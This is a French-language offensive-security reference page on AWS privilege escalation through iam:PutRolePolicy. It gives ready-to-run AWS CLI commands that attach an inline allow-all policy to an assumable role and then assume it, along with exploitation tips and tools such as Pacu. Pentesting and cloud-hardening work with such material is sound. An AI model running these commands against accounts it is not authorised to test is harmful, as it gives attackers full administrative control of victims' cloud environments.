---
title: "PutRolePolicy : intégrer en ligne une politique autorisant tout sur un rôle que vous pouvez assumer"
description: "iam:PutRolePolicy pour intégrer en ligne une politique autorisant tout sur un rôle que vous pouvez assumer."
keywords:
  - PutRolePolicy
  - inline policy
  - role
  - allow-all
  - policy
---

# PutRolePolicy

`iam:PutRolePolicy` intègre en ligne une politique sur un rôle. Intégrez en ligne une instruction autorisant tout sur un rôle que vous pouvez assumer (ou transmettre à un service) et ce rôle devient administrateur.

## Intégrer en ligne puis assumer

```bash
aws iam put-role-policy --role-name <assumable-role> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<assumable-role> --role-session-name s
```

## Notes d'exploitation

- Utile uniquement sur un rôle que vous pouvez atteindre : à combiner avec l'[assomption de rôle](../../role-assumption/index.md) ou une cible `PassRole`.
- Ré-assumez après l'écriture en ligne pour que la session porte les nouvelles permissions.

## Outils

- **AWS CLI** (`iam put-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`).

## Références

- [Rhino Security Labs : élévation de privilèges AWS (PutRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
